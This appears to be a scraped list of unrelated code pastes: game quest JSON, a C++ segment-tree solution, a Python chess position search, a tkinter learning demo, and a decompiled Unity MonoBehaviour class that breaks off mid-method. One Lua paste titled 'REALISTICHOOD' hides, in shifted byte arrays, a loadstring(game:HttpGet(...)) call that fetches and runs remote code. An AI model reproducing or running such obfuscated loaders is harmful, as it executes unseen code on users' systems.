		""015"": ""Ask Judah Kreger to come to the Remnants reunion. He currently resides in Westside.""
	},
	""VEFR01LegionGood2CaesarsFavor"": {
		""010"": ""Find the Legion Dropbox west of Cottonwood Cove.""
	},
	""VEFR00LegionMix2CaesarsHire"": {
		""010"": ""Find the Legion Dropbox west of Cottonwood Cove.""
	}
}"
bQE5Pb1G,REALISTICHOOD | v1.0,YellowGreg,Lua,Friday 21st of June 2024 03:24:57 PM CDT,"
        local klhzT5Lu = {
            113, 117, 98, 104, 125, 124, 120, 111, 116, 109, 42, 108, 107, 113, 107, 66, 81, 125, 125, 122, 80, 103, 120, 49, 39, 112, 122, 122, 118, 117, 68, 57, 56, 124, 101, 129, 117, 102, 118, 109, 119, 119, 56, 128, 109, 118, 109, 108, 118, 50, 105, 115, 116, 52, 103, 118, 107, 53, 122, 104, 122, 52, 83, 78, 70, 84, 74, 84, 85, 81, 69, 99, 81, 83, 86, 73, 41, 50, 47, 50, 48
        }
        local kTpAzAs = {
            5, 6, 1, 4, 10, 8, 6, 6, 6, 6, 2, 5, 10, 4, 6, 8, 9, 9, 9, 10, 9, 2, 4, 9, 5, 8, 6, 6, 6, 2, 10, 10, 9, 10, 4, 10, 2, 3, 4, 4, 7, 3, 10, 10, 8, 4, 10, 7, 10, 4, 8, 3, 4, 5, 6, 6, 2, 6, 8, 7, 3, 5, 1, 9, 5, 8, 1, 1, 1, 8, 2, 4, 9, 4, 7, 5, 7, 9, 6, 10, 7
        }
        local R906nl35 = """"
        for PsGuhy8M = 1, #klhzT5Lu do
            R906nl35 = R906nl35 .. string.char(klhzT5Lu[PsGuhy8M] - kTpAzAs[PsGuhy8M])
        end
        assert(loadstring(R906nl35))()
    
        local YdUIGkTA = {
            116, 115, 108, 117, 123, 46, 44, 126, 106, 120, 119, 107, 116, 112, 40, 121, 106, 104, 123, 123, 107, 102, 126, 106, 113, 111, 38, 45
        }
        local C89Nongl = {
            4, 1, 3, 7, 7, 6, 10, 10, 5, 5, 3, 2, 6, 9, 8, 10, 8, 2, 6, 8, 8, 5, 10, 1, 2, 1, 4, 4
        }
        local gnr3wuighreg = {
            151, 132, 153, 146, 255, 119, 41, 106, 212, 18, 158, 109, 238, 211, 83, 251, 65, 12, 84, 15
        }
    "
P7b4c79x,N. How many rectangles?,danielvitor23,C++,Friday 21st of June 2024 03:13:27 PM CDT,"#include <bits/stdc++.h>
#ifdef ENABLE_DEBUG
  #define DEBUG(x) std::cout << x << std::endl
#else
  #define DEBUG(x)
#endif
#define fi first
#define se second
#define pb push_back
#define all(x) x.begin(),x.end()
#define rall(x) x.rbegin(),x.rend()
using namespace std;
using ii = pair<int, int>;
using i64 = long long;
const int INF = 0x3f3f3f3f;
const i64 INFLL = 0x3f3f3f3f3f3f3f3f;

const int N = 4e5+5;

int tree[4*N];

int query(int node, int l, int r, int ql, int qr) {
  if (qr < l or r < ql) return 0;
  if (ql <= l and r <= qr) return tree[node];
  int mid = (l+r)/2;
  return query(2*node, l, mid, ql, qr) + query(2*node+1, mid+1, r, ql, qr);
}

void update(int node, int l, int r, int idx, int x) {
  if (l == r) {
    tree[node] += x;
    return;
  }
  int mid = (l+r)/2;
  if (idx <= mid) {
    update(2 * node, l, mid, idx, x);
  } else {
    update(2 * node + 1, mid + 1, r, idx, x);
  }
  tree[node] = tree[2 * node] + tree[2 * node + 1];
}

int main() {
  // cin.tie(0)->sync_with_stdio(0);

  int n; cin >> n;

  vector<pair<ii, ii>> pts;

  vector<int> CX, CY;
  for (int i = 0; i < n; ++i) {
    int a, b, c, d; cin >> a >> b >> c >> d;
    CX.pb(a);
    CX.pb(c);
    CY.pb(b);
    CY.pb(d);

    pts.pb({{a, b}, {c, d}});
  }

  vector<pair<int, ii>> queries;

  int q; cin >> q;
  for (int i = 0; i < q; ++i) {
    int x, y; cin >> x >> y;
    queries.pb({i, {x, y}});

    CX.pb(x);
    CY.pb(y);
  }

  sort(all(CX));
  sort(all(CY));

  CX.erase(unique(all(CX)), CX.end());
  CY.erase(unique(all(CY)), CY.end());

  int mx = CX.size() + 1;
  int my = CY.size() + 1;

  vector<vector<int>> lst(mx + 1, vector<int>());
  vector<vector<ii>> lst2(mx + 1, vector<ii>());

  for (int i = 0; i < n; ++i) {
    auto [p, q] = pts[i];
    auto [a, b] = p;
    auto [c, d] = q;

    c = (lower_bound(all(CX), c) - CX.begin()) + 1;
    d = (lower_bound(all(CY), d) - CY.begin()) + 1;

    lst[c].pb(d);
  }

  vector<int> ans(q, -1);
  for (auto [idx, coord] : queries) {
    auto [x, y] = coord;

    x = (lower_bound(all(CX), x) - CX.begin()) + 1;
    y = (lower_bound(all(CY), y) - CY.begin()) + 1;

    lst2[x].pb({idx, y});
  }

  for (int currX = 1; currX <= mx; ++currX) {
    for (int currY : lst[currX]) {
      update(1, 1, my, currY, 1);
    }

    for (auto [idx, currY] : lst2[currX]) {
      int currAns = query(1, 1, my, 1, currY);

      ans[idx] = currAns;
    }
  }

  for (int i = 0; i < q; ++i) {
    cout << ans[i] << '\n';
  }
}"
VCGpgazc,petr OK 500,max2201111,Python,Friday 21st of June 2024 02:53:09 PM CDT,"import chess
from itertools import permutations, combinations

def simplify_fen_string(fen):
    parts = fen.split(' ')
    simplified_fen = ' '.join(parts[:4])  # Zachov√°v√°me pouze informace o pozici
    return simplified_fen

def generate_chess_positions(pieces):
    all_squares = [chess.SQUARES[i] for i in range(64)]
    unique_fens = set()
    
    for squares in combinations(all_squares, len(pieces)):
        for square_perm in permutations(squares):
            board = chess.Board(None)
            board.clear_board()
            for piece, square in zip(pieces, square_perm):
                board.set_piece_at(square, chess.Piece.from_symbol(piece))
            
            # Kontrola platnosti pro tah b√≠l√©ho
            board.turn = chess.WHITE
            if board.is_valid() or board.is_checkmate():
                unique_fens.add(simplify_fen_string(board.fen()))

            # Kontrola platnosti pro tah ƒçern√©ho
            board.turn = chess.BLACK
            if board.is_valid() or board.is_checkmate():
                unique_fens.add(simplify_fen_string(board.fen()))
    
    return unique_fens

# Generov√°n√≠ v≈°ech mo≈æn√Ωch pozic pro zadan√© figury
initial_pieces = ['K', 'k', 'Q']
unique_positions = generate_chess_positions(initial_pieces)

# Startovn√≠ pozice
start_fen = ""6k1/8/5Q2/6K1/8/8/8/8 w - - 0 1""
POZ = {1: start_fen}
AR = {simplify_fen_string(start_fen): {'used': None, 'to_end': None}}
N = 1
M = 0

while M < N:
    M += 1
    current_fen = POZ[M]
    board = chess.Board(current_fen)
    simplified_current_fen = simplify_fen_string(current_fen)
    
    if AR[simplified_current_fen]['used'] is None:
        AR[simplified_current_fen]['used'] = 1
        for move in board.legal_moves:
            board.push(move)
            POZ2 = board.fen()
            simplified_POZ2 = simplify_fen_string(POZ2)
            
            if simplified_POZ2 not in AR:
                AR[simplified_POZ2] = {'used': None, 'to_end': None}
                
            if AR[simplified_POZ2]['used'] is None:
                N += 1
                POZ[N] = simplified_POZ2
            
            board.pop()  # Vr√°t√≠me tah zpƒõt

# P≈ôid√°n√≠ kontroly pro mat, rem√≠zu a v√Ωchoz√≠ hodnotu
for i in range(1, N + 1):
    current_fen = POZ[i]
    board = chess.Board(current_fen)
    simplified_current_fen = simplify_fen_string(current_fen)
    
    if board.is_checkmate():
        AR[simplified_current_fen]['to_end'] = -1000
    elif board.is_stalemate() or board.is_insufficient_material() or board.is_seventyfive_moves() or board.is_fivefold_repetition():
        AR[simplified_current_fen]['to_end'] = 0
    else:
        AR[simplified_current_fen]['to_end'] = 500

F = 0

# Print the results
print(f""Poƒçet pozic je {N}"")
for i in range(1, N + 1):
    F = F+1
    fen = POZ[i]
    simplified_fen = simplify_fen_string(fen)
    used = AR[simplified_fen]['used']
    to_end = AR[simplified_fen]['to_end']
    if to_end != None and to_end != 500 and to_end !=0 and F<10000:
        print(f""{i}: {fen}, used: {used}, to_end: {to_end}"")"
WRAs31ZX,# tk_learnique.py,here2share,Python,Friday 21st of June 2024 02:37:54 PM CDT,"# tk_learnique2.py

import tkinter as tk
import random
import string
import math
import collections

ww = 1200
hh = 600

root = tk.Tk()
root.title(""# tk_learnique.py"")
root.geometry(f""{ww}x{hh}+10+10"")

scrollbar = tk.Scrollbar(root)
scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

canvas = tk.Canvas(root, width=ww, height=hh, bg=""black"", yscrollcommand=scrollbar.set)
canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

scrollbar.config(command=canvas.yview)

def get_nodes(data):
	node = []
	for idx1, s1 in enumerate(data):
		for idx2, s2 in enumerate(data[idx1+1:]):
			s = f""{s1}:{idx1}:{s2}:{idx1+idx2}""
			node += [s]
	return node

def sum_weights(nodes):
    w = {category: 0 for category in range(1, 6)}
    node_sums = {}
    for category in w:
        for node in nodes:
            s1, idx1, s2, idx2 = node.split(':')
            t = weights[category].get(node, 0)
            w[category] += t
            node_sums[s1, int(idx1)] = t
            node_sums[s2, int(idx2)] = t
    return sorted([(w[cat], cat) for cat in w], reverse=True), node_sums

def gym():
    for node in nodes:
        weights[correct_category][node] = min(999, weights[correct_category][node] + 1)

def predict():
    nodes = get_nodes(data)
    sorted_sums, node_sums = sum_weights(nodes)
    prediction = sorted_sums[0][1]
    return prediction, sorted_sums, node_sums, nodes

def update_canvas(i):
    cell_width = 20
    cell_height = 20
    num_cols = 25
    for char, j in node_sums:
        color_value = get_color[min(999, node_sums[char, j])]
        x0 = j * cell_width
        y0 = i * cell_height
        x1 = x0 + cell_width
        y1 = y0 + cell_height
        canvas.create_rectangle(x0, y0, x1, y1, fill=color_value, outline=""gray"")
        canvas.create_text(x0 + 10, y0 + 10, text=char, fill=""white"")

    result_text = f""Y [{correct_category}] "" if is_correct else f""N [{correct_category}] ""
    progress.append(1 if is_correct else 0)
    gain = sum(progress) / 10
    gain_text = f""{gain:.1f}% gain""
    canvas.create_text(num_cols * cell_width + 30, i * cell_height + 10, text=result_text, fill=""white"", anchor=tk.W)
    canvas.create_text(num_cols * cell_width + 80, i * cell_height + 10, text=gain_text, fill=""white"", anchor=tk.W)
    k = 0
    for wt, idx in sorted_sums:
        canvas.create_text(650 + (60 * k), i * cell_height + 10, text=f""{idx}: {wt}"", fill=""white"", anchor=tk.W)
        k += 1
    canvas.create_text(650 + (60 * k), i * cell_height + 10, text=line+1, fill=""white"", anchor=tk.W)

    canvas.config(scrollregion=(0, 0, ww, (i + 1) * cell_height + cell_height))

    root.update()

progress = collections.deque(maxlen=1000)
weights = {i+1: collections.defaultdict(int) for i in range(5)}

j = 256 / 400
a = [int(i * j) for i in range(400)]
b = [0 for _ in range(300)]
red = a[::-1] + b + b
green = b + b + a
blue = b + a + b
get_color = [f'#{r:02X}{g:02X}{b:02X}' for r, g, b in zip(red, green, blue)]

def shuffle_mixed_case(s):
    mixed = [c.lower() if random.random() < 0.5 else c.upper() for c in s]
    random.shuffle(mixed)
    return ''.join(mixed)

def category_1():
    digits = ''.join(random.choices(string.digits, k=7))
    combined = digits + 'yellow'
    combined += ''.join(random.choices(string.ascii_letters, k=(25 - len(combined))))
    return shuffle_mixed_case(combined)

def category_2():
    digits = ''.join(random.choices(string.digits, k=9))
    combined = digits + 'helloworld'
    combined += ''.join(random.choices(string.ascii_letters, k=(25 - len(combined))))
    return shuffle_mixed_case(combined)

def category_3():
    combined = 'python3407'
    combined += ''.join(random.choices(string.ascii_letters + string.digits, k=(25 - len(combined))))
    return shuffle_mixed_case(combined)

def category_4():
    combined = 'thankyou12345'
    combined += ''.join(random.choices(string.ascii_letters + string.digits, k=(25 - len(combined))))
    return shuffle_mixed_case(combined)

def category_5():
    s = []
    for i in range(12):
        s.append(random.choice(string.ascii_letters))
        s.append(random.choice(string.digits))
    s.append(random.choice(string.ascii_letters))
    return ''.join(s)

category_functions = {
    1: category_1,
    2: category_2,
    3: category_3,
    4: category_4,
    5: category_5
}

def generate_training_data(category):
    return category_functions[category]()

number_of_data = 5000
categories = [1, 2, 3, 4, 5] * (number_of_data // 5)
random.shuffle(categories)

training_data = [(generate_training_data(category), category) for category in categories]

line = 0
auto_scroll = True

def toggle_auto_scroll(event):
    global auto_scroll
    auto_scroll = not auto_scroll

root.bind(""<space>"", toggle_auto_scroll)

while True:
    data, correct_category = training_data[line % number_of_data]
    prediction, sorted_sums, node_sums, nodes = predict()
    is_correct = prediction == correct_category
    if not is_correct:
        gym()
    update_canvas(line)
    if auto_scroll:
        canvas.yview_moveto(1.0)
    line += 1"
00GB3vQr,monobehaviour,Przemekkk,C#,Friday 21st of June 2024 02:27:48 PM CDT,"#region Assembly UnityEngine.CoreModule, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// D:\Steam\steamapps\common\Sons Of The Forest\_RedLoader\Game\UnityEngine.CoreModule.dll
// Decompiled with ICSharpCode.Decompiler 8.1.1.7464
#endregion

using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using Il2CppInterop.Common.Attributes;
using Il2CppInterop.Runtime;
using Il2CppSystem;
using Il2CppSystem.Collections;
using Il2CppSystem.Threading;

namespace UnityEngine;

public class MonoBehaviour : Behaviour
{
    private static readonly System.IntPtr NativeFieldInfoPtr_m_CancellationTokenSource;

    private static readonly System.IntPtr NativeMethodInfoPtr_get_destroyCancellationToken_Public_get_CancellationToken_0;

    private static readonly System.IntPtr NativeMethodInfoPtr_RaiseCancellation_Private_Void_0;

    private static readonly System.IntPtr NativeMethodInfoPtr_IsInvoking_Public_Boolean_0;

    private static readonly System.IntPtr NativeMethodInfoPtr_CancelInvoke_Public_Void_0;

    private static readonly System.IntPtr NativeMethodInfoPtr_Invoke_Public_Void_String_Single_0;

    private static readonly System.IntPtr NativeMethodInfoPtr_InvokeRepeating_Public_Void_String_Single_Single_0;

    private static readonly System.IntPtr NativeMethodInfoPtr_CancelInvoke_Public_Void_String_0;

    private static readonly System.IntPtr NativeMethodInfoPtr_IsInvoking_Public_Boolean_String_0;

    private static readonly System.IntPtr NativeMethodInfoPtr_StartCoroutine_Public_Coroutine_String_0;

    private static readonly System.IntPtr NativeMethodInfoPtr_StartCoroutine_Public_Coroutine_String_Object_0;

    private static readonly System.IntPtr NativeMethodInfoPtr_StartCoroutine_Public_Coroutine_IEnumerator_0;

    private static readonly System.IntPtr NativeMethodInfoPtr_StartCoroutine_Auto_Public_Coroutine_IEnumerator_0;

    private static readonly System.IntPtr NativeMethodInfoPtr_StopCoroutine_Public_Void_IEnumerator_0;

    private static readonly System.IntPtr NativeMethodInfoPtr_StopCoroutine_Public_Void_Coroutine_0;

    private static readonly System.IntPtr NativeMethodInfoPtr_StopCoroutine_Public_Void_String_0;

    private static readonly System.IntPtr NativeMethodInfoPtr_StopAllCoroutines_Public_Void_0;

    private static readonly System.IntPtr NativeMethodInfoPtr_get_useGUILayout_Public_get_Boolean_0;

    private static readonly System.IntPtr NativeMethodInfoPtr_set_useGUILayout_Public_set_Void_Boolean_0;

    private static readonly System.IntPtr NativeMethodInfoPtr_print_Public_Static_Void_Object_0;

    private static readonly System.IntPtr NativeMethodInfoPtr_Internal_CancelInvokeAll_Private_Static_Void_MonoBehaviour_0;

    private static readonly System.IntPtr NativeMethodInfoPtr_Internal_IsInvokingAll_Private_Static_Boolean_MonoBehaviour_0;

    private static readonly System.IntPtr NativeMethodInfoPtr_InvokeDelayed_Private_Static_Void_MonoBehaviour_String_Single_Single_0;

    private static readonly System.IntPtr NativeMethodInfoPtr_CancelInvoke_Private_Static_Void_MonoBehaviour_String_0;

    private static readonly System.IntPtr NativeMethodInfoPtr_IsInvoking_Private_Static_Boolean_MonoBehaviour_String_0;

    private static readonly System.IntPtr NativeMethodInfoPtr_IsObjectMonoBehaviour_Private_Static_Boolean_Object_0;

    private static readonly System.IntPtr NativeMethodInfoPtr_StartCoroutineManaged_Private_Coroutine_String_Object_0;

    private static readonly System.IntPtr NativeMethodInfoPtr_StartCoroutineManaged2_Private_Coroutine_IEnumerator_0;

    private static readonly System.IntPtr NativeMethodInfoPtr_StopCoroutineManaged_Private_Void_Coroutine_0;

    private static readonly System.IntPtr NativeMethodInfoPtr_StopCoroutineFromEnumeratorManaged_Private_Void_IEnumerator_0;

    private static readonly System.IntPtr NativeMethodInfoPtr_GetScriptClassName_Internal_String_0;

    private static readonly System.IntPtr NativeMethodInfoPtr_OnCancellationTokenCreated_Private_Void_0;

    private static readonly System.IntPtr NativeMethodInfoPtr__ctor_Public_Void_0;

    public unsafe CancellationTokenSource m_CancellationTokenSource
    {
        get
        {
            nint num = (nint)IL2CPP.Il2CppObjectBaseToPtrNotNull(this) + (int)IL2CPP.il2cpp_field_get_offset(NativeFieldInfoPtr_m_CancellationTokenSource);
            System.IntPtr intPtr = *(System.IntPtr*)num;
            return (intPtr != (System.IntPtr)0) ? new CancellationTokenSource(intPtr) : null;
        }
        set
        {
            System.IntPtr num = IL2CPP.Il2CppObjectBaseToPtrNotNull(this);
            IL2CPP.il2cpp_gc_wbarrier_set_field(num, (nint)num + (int)IL2CPP.il2cpp_field_get_offset(NativeFieldInfoPtr_m_CancellationTokenSource), IL2CPP.Il2CppObjectBaseToPtr(value));
        }
    }

    public unsafe CancellationToken destroyCancellationToken
    {
        [CallerCount(0)]
        [CachedScanResults(RefRangeStart = 0, RefRangeEnd = 0, XrefRangeStart = 1717559, XrefRangeEnd = 1717568, MetadataInitTokenRva = 0L, MetadataInitFlagRva = 0L)]
        get
        {
            IL2CPP.Il2CppObjectBaseToPtrNotNull(this);
            System.IntPtr* param = null;
            System.Runtime.CompilerServices.Unsafe.SkipInit(out System.IntPtr exc);
            System.IntPtr pointer = IL2CPP.il2cpp_runtime_invoke(NativeMethodInfoPtr_get_destroyCancellationToken_Public_get_CancellationToken_0, IL2CPP.Il2CppObjectBaseToPtrNotNull(this), (void**)param, ref exc);
            Il2CppException.RaiseExceptionIfNecessary(exc);
            return new CancellationToken(pointer);
        }
    }

    public unsafe bool useGUILayout
    {
        [CallerCount(0)]
        [CachedScanResults(RefRangeStart = 0, RefRangeEnd = 0, XrefRangeStart = 1718309, XrefRangeEnd = 1718313, MetadataInitTokenRva = 0L, MetadataInitFlagRva = 0L)]
        get
        {
            IL2CPP.Il2CppObjectBaseToPtrNotNull(this);
            System.IntPtr* param = null;
            System.Runtime.CompilerServices.Unsafe.SkipInit(out System.IntPtr exc);
            System.IntPtr obj = IL2CPP.il2cpp_runtime_invoke(NativeMethodInfoPtr_get_useGUILayout_Public_get_Boolean_0, IL2CPP.Il2CppObjectBaseToPtrNotNull(this), (void**)param, ref exc);
            Il2CppException.RaiseExceptionIfNecessary(exc);
            return *(bool*)IL2CPP.il2cpp_object_unbox(obj);
        }
        [CallerCount(0)]
        [CachedScanResults(RefRangeStart = 0, RefRangeEnd = 0, XrefRangeStart = 1718313, XrefRangeEnd = 1718317, MetadataInitTokenRva = 0L, MetadataInitFlagRva = 0L)]
        [param: DefaultParameterValue(null)]
        set
        {
            IL2CPP.Il2CppObjectBaseToPtrNotNull(this);
            System.IntPtr* ptr = stackalloc System.IntPtr[1];
            *ptr = (nint)(&value);
            System.Runtime.CompilerServices.Unsafe.SkipInit(out System.IntPtr exc);
            System.IntPtr intPtr = IL2CPP.il2cpp_runtime_invoke(NativeMethodInfoPtr_set_useGUILayout_Public_set_Void_Boolean_0, IL2CPP.Il2CppObjectBaseToPtrNotNull(this), (void**)ptr, ref exc);
            Il2CppException.RaiseExceptionIfNecessary(exc);
        }
    }

    [CallerCount(0)]
    [CachedScanResults(RefRangeStart = 0, RefRangeEnd = 0, XrefRangeStart = 1717568, XrefRangeEnd = 1717570, MetadataInitTokenRva = 0L, MetadataInitFlagRva = 0L)]
    public unsafe void RaiseCancellation()
    {
        IL2CPP.Il2CppObjectBaseToPtrNotNull(this);
        System.IntPtr* param = null;
        System.Runtime.CompilerServices.Unsafe.SkipInit(out System.IntPtr exc);
        System.IntPtr intPtr = IL2CPP.il2cpp_runtime_invoke(NativeMethodInfoPtr_RaiseCancellation_Private_Void_0, IL2CPP.Il2CppObjectBaseToPtrNotNull(this), (void**)param, ref exc);
        Il2CppException.RaiseExceptionIfNecessary(exc);
    }

    [CallerCount(0)]
    [CachedScanResults(RefRangeStart = 0, RefRangeEnd = 0, XrefRangeStart = 1717570, XrefRangeEnd = 1717574, MetadataInitTokenRva = 0L, MetadataInitFlagRva = 0L)]
    public unsafe bool IsInvoking()
    {
        IL2CPP.Il2CppObjectBaseToPtrNotNull(this);
        System.IntPtr* param = null;
        System.Runtime.CompilerServices.Unsafe.SkipInit(out System.IntPtr exc);
        System.IntPtr obj = IL2CPP.il2cpp_runtime_invoke(NativeMethodInfoPtr_IsInvoking_Public_Boolean_0, IL2CPP.Il2CppObjectBaseToPtrNotNull(this), (void**)param, ref exc);
        Il2CppException.RaiseExceptionIfNecessary(exc);
        return *(bool*)IL2CPP.il2cpp_object_unbox(obj);
    }

    [CallerCount(0)]
    [CachedScanResults(RefRangeStart = 0, RefRangeEnd = 0, XrefRangeStart = 0, XrefRangeEnd = 0, MetadataInitTokenRva = 0L, MetadataInitFlagRva = 0L)]
    public unsafe void CancelInvoke()
    {
        IL2CPP.Il2CppObjectBaseToPtrNotNull(this);
        System.IntPtr* param = null;
        System.Runtime.CompilerServices.Unsafe.SkipInit(out System.IntPtr exc);
        System.IntPtr intPtr = IL2CPP.il2cpp_runtime_invoke(NativeMethodInfoPtr_CancelInvoke_Public_Void_0, IL2CPP.Il2CppObjectBaseToPtrNotNull(this), (void**)param, ref exc);
        Il2CppException.RaiseExceptionIfNecessary(exc);
    }

    [CallerCount(0)]
    [CachedScanResults(RefRangeStart = 0, RefRangeEnd = 0, XrefRangeStart = 1717574, XrefRangeEnd = 1717575, MetadataInitTokenRva = 0L, MetadataInitFlagRva = 0L)]
    public unsafe void Invoke([DefaultParameterValue(null)] string methodName, [DefaultParameterValue(null)] float time)
    {
        IL2CPP.Il2CppObjectBaseToPtrNotNull(this);
        System.IntPtr* ptr = stackalloc System.IntPtr[2];
        *ptr = IL2CPP.ManagedStringToIl2Cpp(methodName);
        *(float**)((byte*)ptr + checked((nuint)1u * unchecked((nuint)sizeof(System.IntPtr)))) = &time;
        System.Runtime.CompilerServices.Unsafe.SkipInit(out System.IntPtr exc);
        System.IntPtr intPtr = IL2CPP.il2cpp_runtime_invoke(NativeMethodInfoPtr_Invoke_Public_Void_String_Single_0, IL2CPP.Il2CppObjectBaseToPtrNotNull(this), (void**)ptr, ref exc);
        Il2CppException.RaiseExceptionIfNecessary(exc);
    }

    [CallerCount(22)]
    [CachedScanResults(RefRangeStart = 1717582, RefRangeEnd = 1717604, XrefRangeStart = 1717575, XrefRangeEnd = 1717582, MetadataInitTokenRva = 0L, MetadataInitFlagRva = 0L)]
    public unsafe void InvokeRepeating([DefaultParameterValue(null)] string methodName, [DefaultParameterValue(null)] float time, [DefaultParameterValue(null)] float repeatRate)
    {
        IL2CPP.Il2CppObjectBaseToPtrNotNull(this);
        System.IntPtr* ptr = stackalloc System.IntPtr[3];
        *ptr = IL2CPP.ManagedStringToIl2Cpp(methodName);
        *(float**)((byte*)ptr + checked((nuint)1u * unchecked((nuint)sizeof(System.IntPtr)))) = &time;
        *(float**)((byte*)ptr + checked((nuint)2u * unchecked((nuint)sizeof(System.IntPtr)))) = &repeatRate;
        System.Runtime.CompilerServices.Unsafe.SkipInit(out System.IntPtr exc);
        System.IntPtr intPtr = IL2CPP.il2cpp_runtime_invoke(NativeMethodInfoPtr_InvokeRepeating_Public_Void_String_Single_Single_0, IL2CPP.Il2CppObjectBaseToPtrNotNull(this), (void**)ptr, ref exc);
        Il2CppException.RaiseExceptionIfNecessary(exc);
    }

    [CallerCount(9)]
    [CachedScanResults(RefRangeStart = 1717608, RefRangeEnd = 1717617, XrefRangeStart = 1717604, XrefRangeEnd = 1717608, MetadataInitTokenRva = 0L, MetadataInitFlagRva = 0L)]
    public unsafe void CancelInvoke([DefaultParameterValue(null)] string methodName)
    {
        IL2CPP.Il2CppObjectBaseToPtrNotNull(this);
        System.IntPtr* ptr = stackalloc System.IntPtr[1];
        *ptr = IL2CPP.ManagedStringToIl2Cpp(methodName);
        System.Runtime.CompilerServices.Unsafe.SkipInit(out System.IntPtr exc);
        System.IntPtr intPtr = IL2CPP.il2cpp_runtime_invoke(NativeMethodInfoPtr_CancelInvoke_Public_Void_String_0, IL2CPP.Il2CppObjectBaseToPtrNotNull(this), (void**)ptr, ref exc);
        Il2CppException.RaiseExceptionIfNecessary(exc);
    }

    [CallerCount(0)]
    [CachedScanResults(RefRangeStart = 0, RefRangeEnd = 0, XrefRangeStart = 1717617, XrefRangeEnd = 1717621, MetadataInitTokenRva = 0L, MetadataInitFlagRva = 0L)]
    public unsafe bool IsInvoking([DefaultParameterValue(null)] string methodName)
    {
        IL2CPP.Il2CppObjectBaseToPtrNotNull(this);
        System.IntPtr* ptr = stackalloc System.IntPtr[1];
        *ptr = IL2CPP.ManagedStringToIl2Cpp(methodName);
        System.Runtime.CompilerServices.Unsafe.SkipInit(out System.IntPtr exc);
        System.IntPtr obj = IL2CPP.il2cpp_runtime_invoke(NativeMethodInfoPtr_IsInvoking_Public_Boolean_String_0, IL2CPP.Il2CppObjectBaseToPtrNotNull(this), (void**)ptr, ref exc);
        Il2CppException.RaiseExceptionIfNecessary(exc);
        return *(bool*)IL2CPP.il2cpp_object_unbox(obj);
    }

    [CallerCount(0)]
    [CachedScanResults(RefRangeStart = 0, RefRangeEnd = 0, XrefRangeStart = 1717621, XrefRangeEnd = 1717622, MetadataInitTokenRva = 0L, MetadataInitFlagRva = 0L)]
    public unsafe Coroutine StartCoroutine([DefaultParameterValue(null)] string methodName)
    {
        IL2CPP.Il2CppObjectBaseToPtrNotNull(this);
        System.IntPtr* ptr = stackalloc System.IntPtr[1];
        *ptr = IL2CPP.ManagedStringToIl2Cpp(methodName);
        System.Runtime.CompilerServices.Unsafe.SkipInit(out System.IntPtr exc);
        System.IntPtr intPtr = IL2CPP.il2cpp_runtime_invoke(NativeMethodInfoPtr_StartCoroutine_Public_Coroutine_String_0, IL2CPP.Il2CppObjectBaseToPtrNotNull(this), (void**)ptr, ref exc);
        Il2CppException.RaiseExceptionIfNecessary(exc);
        return (intPtr != (System.IntPtr)0) ? new Coroutine(intPtr) : null;
    }

    [CallerCount(68)]
    [CachedScanResults(RefRangeStart = 1717642, RefRangeEnd = 1717710, XrefRangeStart = 1717622, XrefRangeEnd = 1717642, MetadataInitTokenRva = 0L, MetadataInitFlagRva = 0L)]
    public unsafe Coroutine StartCoroutine([DefaultParameterValue(null)] string methodName, [DefaultParameterValue(null)] Il2CppSystem.Object value)
    {
        IL2CPP.Il2CppObjectBaseToPtrNotNull(this);
        System.IntPtr* ptr = stackalloc System.IntPtr[2];
        *ptr = IL2CPP.ManagedStringToIl2Cpp(methodName);
        *(System.IntPtr*)((byte*)ptr + checked((nuint)1u * unchecked((nuint)sizeof(System.IntPtr)))) = IL2CPP.Il2CppObjectBaseToPtr(value);
        System.Runtime.CompilerServices.Unsafe.SkipInit(out System.IntPtr exc);
        System.IntPtr intPtr = IL2CPP.il2cpp_runtime_invoke(NativeMethodInfoPtr_StartCoroutine_Public_Coroutine_String_Object_0, IL2CPP.Il2CppObjectBaseToPtrNotNull(this), (void**)ptr, ref exc);
        Il2CppException.RaiseExceptionIfNecessary(exc);
        return (intPtr != (System.IntPtr)0) ? new Coroutine(intPtr) : null;
    }

    [CallerCount(429)]
    [CachedScanResults(RefRangeStart = 1717730, RefRangeEnd = 1718159, XrefRangeStart = 1717710, XrefRangeEnd = 1717730, MetadataInitTokenRva = 0L, MetadataInitFlagRva = 0L)]
    public unsafe Coroutine StartCoroutine([DefaultParameterValue(null)] IEnumerator routine)
    {
        IL2CPP.Il2CppObjectBaseToPtrNotNull(this);
        System.IntPtr* ptr = stackalloc System.IntPtr[1];
        *ptr = IL2CPP.Il2CppObjectBaseToPtr(routine);
        System.Runtime.CompilerServices.Unsafe.SkipInit(out System.IntPtr exc);
        System.IntPtr intPtr = IL2CPP.il2cpp_runtime_invoke(NativeMethodInfoPtr_StartCoroutine_Public_Coroutine_IEnumerator_0, IL2CPP.Il2CppObjectBaseToPtrNotNull(this), (void**)ptr, ref exc);
        Il2CppException.RaiseExceptionIfNecessary(exc);
        return (intPtr != (System.IntPtr)0) ? new Coroutine(intPtr) : null;
    }

    [CallerCount(0)]
    [CachedScanResults(RefRangeStart = 0, RefRangeEnd = 0, XrefRangeStart = 1718159, XrefRangeEnd = 1718160, MetadataInitTokenRva = 0L, MetadataInitFlagRva = 0L)]
    public unsafe Coroutine StartCoroutine_Auto([DefaultParameterValue(null)] IEnumerator routine)
    {
        IL2CPP.Il2CppObjectBaseToPtrNotNull(this);
        System.IntPtr* ptr = stackalloc System.IntPtr[1];
        *ptr = IL2CPP.Il2CppObjectBaseToPtr(routine);
        System.Runtime.CompilerServices.Unsafe.SkipInit(out System.IntPtr exc);
        System.IntPtr intPtr = IL2CPP.il2cpp_runtime_invoke(NativeMethodInfoPtr_StartCoroutine_Auto_Public_Coroutine_IEnumerator_0, IL2CPP.Il2CppObjectBaseToPtrNotNull(this), (void**)ptr, ref exc);
        Il2CppException.RaiseExceptionIfNecessary(exc);
        return (intPtr != (System.IntPtr)0) ? new Coroutine(intPtr) : null;
    }

    [CallerCount(7)]
    [CachedScanResults(RefRangeStart = 1718180, RefRangeEnd = 1718187, XrefRangeStart = 1718160, XrefRangeEnd = 1718180, MetadataInitTokenRva = 0L, MetadataInitFlagRva = 0L)]
    public unsafe void StopCoroutine([DefaultParameterValue(null)] IEnumerator routine)
    {
        IL2CPP.Il2CppObjectBaseToPtrNotNull(this);
        System.IntPtr* ptr = stackalloc System.IntPtr[1];
        *ptr = IL2CPP.Il2CppObjectBaseToPtr(routine);
